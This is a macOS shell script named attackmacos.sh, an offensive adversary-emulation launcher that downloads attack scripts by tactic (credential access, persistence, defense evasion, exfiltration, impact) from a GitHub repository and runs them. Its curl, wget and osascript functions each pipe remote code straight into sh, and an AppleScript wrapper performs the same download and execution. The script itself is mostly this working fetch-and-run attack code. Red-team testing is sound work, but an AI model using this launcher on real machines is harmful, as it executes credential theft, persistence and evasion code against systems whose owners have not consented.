# Script Name: attackmacos.sh
# Platform: macOS
# Author: @darmado | x.com/darmad0 
# Date: 2023-10-06
# Version: 1.0

# Description:
# This tool fetches and executes scripts from the attack-macOS repository.
# with curl, wget, and osascript.


# Base URL for fetching scripts
GIT_URL="https://raw.githubusercontent.com/darmado/attack-macOS/main/{tactic}/{ttp}"

# Function to display help
display_help() {
    echo "Usage: attackmacos.sh --<method> tactic=<Tactic> ttp=<TTP> --args=<arguments>"
    echo "       attackmacos.sh --local tactic=<Tactic> ttp=<TTP> --args=<arguments>"
    echo
    echo "Methods:"
    echo "  --curl                 Use curl to download the script."
    echo "  --wget                 Use wget to download the script."
    echo "  --osascript            Use AppleScript to download the script."
    echo "  --local                Execute the script locally."
    echo
    echo "TTP arguments are unique and will not be listed here."
    echo "To find the specific arguments for each TTP, check the script documentation or the script itself."
    echo
    echo "Available Tactics:"
    echo "  - Credential_Access"
    echo "  - Discovery"
    echo "  - Initial_Access"
    echo "  - Execution"
    echo "  - Persistence"
    echo "  - Privilege_Escalation"
    echo "  - Defense_Evasion"
    echo "  - Credential_Exfiltration"
    echo "  - Impact"
    echo
    echo "Examples:"
    echo "  ./attackmacos.sh --curl tactic=credential_access ttp=accounts --args=--help"
    echo "  ./attackmacos.sh --wget tactic=discovery ttp=accounts --args='--verbose --log'"
    echo "  ./attackmacos.sh --osascript tactic=initial_access ttp=accounts --args='--enable'"
    echo "  ./attackmacos.sh --local tactic=execution ttp=run_script --args='-s'"
}

# Function to execute locally
execute_local() {
    local tactic="$1"
    local ttp="$2"
    local args="$3"
    local LOCAL_PATH="./TTP/$tactic/$ttp"

    if [ -f "$LOCAL_PATH" ]; then
        echo "Executing local script: $LOCAL_PATH -- $args"
        sh "$LOCAL_PATH" $args  # Remove the extra '--'
    else
        echo "Error: Script not found at $LOCAL_PATH"
        exit 1
    fi
}

# Function to execute using curl
execute_curl() {
    local tactic="$1"
    local ttp="$2"
    local args="$3"
    local url="${GIT_URL/\{tactic\}/$tactic}"  # Replace {tactic} with the actual tactic
    url="${url/\{ttp\}/$ttp}"                    # Replace {ttp} with the actual TTP
    echo "Executing with curl: $url -- $args"
    curl -sSL "$url" | sh -s -- $args
}

# Function to execute using wget
execute_wget() {
    local tactic="$1"
    local ttp="$2"
    local args="$3"
    local url="${GIT_URL/\{tactic\}/$tactic}"  # Replace {tactic} with the actual tactic
    url="${url/\{ttp\}/$ttp}"                    # Replace {ttp} with the actual TTP
    echo "Executing with wget: $url -- $args"
    wget -qO- "$url" | sh -s -- $args
}

# Function to execute using osascript
execute_osascript() {
    local tactic="$1"
    local ttp="$2"
    local args="$3"
    local url="${GIT_URL/\{tactic\}/$tactic}"  # Replace {tactic} with the actual tactic
    url="${url/\{ttp\}/$ttp}"                    # Replace {ttp} with the actual TTP
    echo "Executing with osascript: $url -- $args"
    osascript -e "do shell script \"curl -sSL '$url' | sh -s -- $args\""
}

# Main function to parse arguments and call the appropriate function
main() {
    local method="$1"
    local tactic="$2"
    local ttp="$3"
    local args="$4"

    # Convert tactic from underscore format to Capitalized format
    tactic=$(echo "$tactic" | sed 's/_/ /g' | awk '{for(i=1;i<=NF;i++) $i=toupper(substr($i,1,1)) substr($i,2)}1' | tr ' ' '_')

    if [ "$method" == "--local" ]; then
        execute_local "$tactic" "$ttp" "$args"
    else
        # Call the appropriate function based on the method
        case "$method" in
            --curl)
                execute_curl "$tactic" "$ttp" "$args"
                ;;
            --wget)
                execute_wget "$tactic" "$ttp" "$args"
                ;;
            --osascript)
                execute_osascript "$tactic" "$ttp" "$args"
                ;;
            *)
                echo "Unsupported method: $method"
                exit 1
                ;;
        esac
    fi
}

# Check for the correct number of arguments
if [ "$#" -eq 1 ] && [[ "$1" == "--help" ]]; then
    display_help
    exit 0
fi

if [ "$#" -lt 4 ]; then
    echo "Usage: $0 --<method> tactic=<Tactic> ttp=<TTP> --args=<arguments>"
    echo "       $0 --local tactic=<Tactic> ttp=<TTP> --args=<arguments>"
    exit 1
fi

# Parse input arguments
method="$1"                     # Extract method
tactic=$(echo "$2" | cut -d'=' -f2)  # Extract tactic
ttp=$(echo "$3" | cut -d'=' -f2)      # Extract TTP
args=$(echo "$4" | cut -d'=' -f2)     # Extract args

# Call the main function with the parsed arguments
main "$method" "$tactic" "$ttp" "$args"